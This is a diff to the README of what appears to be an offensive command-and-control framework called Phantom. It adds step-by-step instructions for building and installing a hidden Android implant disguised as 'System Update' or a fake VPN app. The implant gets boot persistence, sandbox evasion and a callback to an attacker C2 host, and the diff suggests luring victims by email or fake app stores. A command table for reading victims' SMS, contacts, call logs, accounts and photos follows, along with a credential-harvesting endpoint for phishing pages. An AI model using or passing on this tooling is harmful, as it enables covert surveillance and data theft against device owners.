@@ -692,28 +692,76 @@ phantom > generate vba https://your-c2.com:443
 
 ## Mobile Payloads (Android + iOS)
 
-### Quick Start — Android App with C2 Callback
+### Quick Start — Standalone APK Builder (No Gradle / No Android Studio Project)
+
+The fastest path to a working Android C2 agent. Uses raw SDK tools (`aapt`, `d8`, `apksigner`) — no Gradle project, no Android Studio build chain. Requires only the Android SDK and a JDK.
 
 ```bash
-# Step 1: Generate a fake VPN app
+# Step 1: Edit the C2 callback URL in the build script
+#   Open payloads/android/build_apk.sh and set:
+#   C2_URL="http://YOUR-C2-IP:8080"
+
+# Step 2: Build the APK (on any host with Android SDK installed)
+bash payloads/android/build_apk.sh
+
+# Step 3: Install on target device
+adb install /tmp/phantom.apk
+
+# Step 4: Launch (app hides immediately — foreground service starts)
+adb shell am start -n com.android.systemupdate/.MainActivity
+
+# Step 5: Verify in Phantom Web UI or CLI
+#   The agent registers via /api/v1/mobile/register
+#   and checks in every 10s via /api/v1/mobile/checkin
+
+# Step 6: Send commands from the Web UI (http://localhost:3000)
+#   Or from the command line:
+python3 phantom_cli.py <agent-name> shell "whoami"
+python3 phantom_cli.py <agent-name> shell "id"
+python3 phantom_cli.py <agent-name> shell "ls /sdcard/"
+python3 phantom_cli.py <agent-name> shell "content query --uri content://sms"
+python3 phantom_cli.py <agent-name> shell "content query --uri content://contacts/phones"
+```
+
+**What the APK does:**
+- Disguised as "System Update" with invisible launcher (Theme.NoDisplay)
+- Foreground service with notification — survives Android 8+ background execution limits
+- Boot persistence via BroadcastReceiver
+- Permissions: Internet, Location, Camera, Mic, Contacts, SMS, Call Log, Storage, Phone State
+- Calls back to Phantom's mobile REST API (`/api/v1/mobile/register` + `/api/v1/mobile/checkin`)
+- Executes shell commands from C2 and returns output
+
+**Requirements:**
+- Android SDK with build-tools (aapt, d8, apksigner)
+- Java JDK 8+ (javac)
+- Target device: Android 5+ (API 21+), x86_64 for emulators
+
+> **Full exploitation guide** with network setup, deployment steps, protocol details, and
+> post-exploitation commands: see [`docs/mobile-exploitation-guide.html`](docs/mobile-exploitation-guide.html)
+> (render to PDF with `weasyprint docs/mobile-exploitation-guide.html guide.pdf`)
+
+### Quick Start — Via Phantom CLI (App Templates)
+
+```bash
+# Generate a fake VPN app with full UI
 phantom > generate app vpn-shield https://YOUR-C2-IP:8080
 
-# Step 2: Build the APK
+# Build the APK
 cd build/payloads/apps/vpn_shield
 # Open in Android Studio → Build → Build APK
 # Or: gradle assembleRelease
 
-# Step 3: Deliver to target
+# Deliver to target
 # - Send APK via email/message
 # - Host on fake app store page
 # - QR code linking to download
 
-# Step 4: When target installs and opens the app
+# When target installs and opens the app
 # - They see a legitimate VPN interface
 # - Background service starts C2 callback
 # - Agent appears in Phantom: "phantom > agents"
 
-# Step 5: Interact with mobile agent
+# Interact with mobile agent
 phantom > interact toxic-cobra
 phantom [toxic-cobra] > shell id
 phantom [toxic-cobra] > sysinfo
@@ -760,6 +808,38 @@ All generated apps automatically include evasion that:
 - Detects debuggers and analysis tools
 - Delays C2 callback 60-120s to outlast sandbox analysis
 - Stays fully dormant if any analysis is detected
+
+### Mobile Post-Exploitation Commands
+
+Once the agent is registered, send these via the Web UI or CLI:
+
+| Command | Purpose |
+|---------|---------|
+| `whoami` | Current user (e.g. `u0_a152`) |
+| `id` | Full identity + groups (inet, everybody, cache) |
+| `getprop ro.product.model` | Device model |
+| `getprop ro.build.version.release` | Android version |
+| `settings get secure android_id` | Unique device ID |
+| `pm list packages -3` | Third-party installed apps |
+| `content query --uri content://sms` | Read SMS messages |
+| `content query --uri content://call_log/calls` | Call history |
+| `content query --uri content://contacts/phones` | Contact list |
+| `dumpsys wifi` | Saved WiFi networks |
+| `dumpsys account` | Google accounts on device |
+| `dumpsys telephony.registry` | Cell tower info / location |
+| `dumpsys battery` | Battery state |
+| `ls /sdcard/DCIM/Camera/` | List photos |
+| `ls /sdcard/Download/` | List downloads |
+| `cat /proc/net/arp` | ARP table (nearby devices) |
+| `netstat -tlnp` | Open ports / listening services |
+
+### Mobile C2 REST API
+
+| Endpoint | Method | Purpose |
+|----------|--------|---------|
+| `/api/v1/mobile/register` | POST | First-time agent registration (JSON) |
+| `/api/v1/mobile/checkin` | POST | Periodic check-in — receives tasks, returns results |
+| `/api/v1/creds` | POST | Credential harvesting receiver (from phishing pages) |
 
 ---
 
